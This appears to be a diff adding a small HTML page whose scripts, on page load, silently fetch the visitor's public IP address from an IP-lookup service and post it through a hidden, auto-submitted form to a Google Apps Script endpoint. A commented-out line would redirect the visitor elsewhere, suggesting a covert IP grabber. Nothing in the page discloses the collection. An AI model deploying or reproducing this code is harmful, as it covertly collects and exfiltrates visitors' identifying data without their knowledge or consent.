@@ -1,0 +1,36 @@
+
+<form name="submit-to-google-sheet">
+  <input type='hidden' name="ip" type="text" id="ip" placeholder="ip" required>
+  <button type="submit" id="go" style="display: none;"</button>
+</form>
+
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbxmEdOzb9pR1SAoR5gcC4HDMvppPcLLTrA8A6-FSdF2vskn83ro/exec'
+  const form = document.forms['submit-to-google-sheet']
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+
+<script type="application/javascript">
+      function user_location() {
+		var xhttp = new XMLHttpRequest();
+		xhttp.onreadystatechange = function() {
+		if (this.readyState == 4 && this.status == 200) {
+			var ipInfo = this.responseText;
+			var userNameField = document.getElementById("ip");
+            userNameField.value = ipInfo;
+            var goButton = document.getElementById("go");
+            goButton.click();
+		}
+		};
+		xhttp.open("GET", "https://api.ipify.org", true);
+		xhttp.send();
+	  }
+	  user_location();
+	  //window.location.replace("http://stackoverflow.com");
+</script>
+
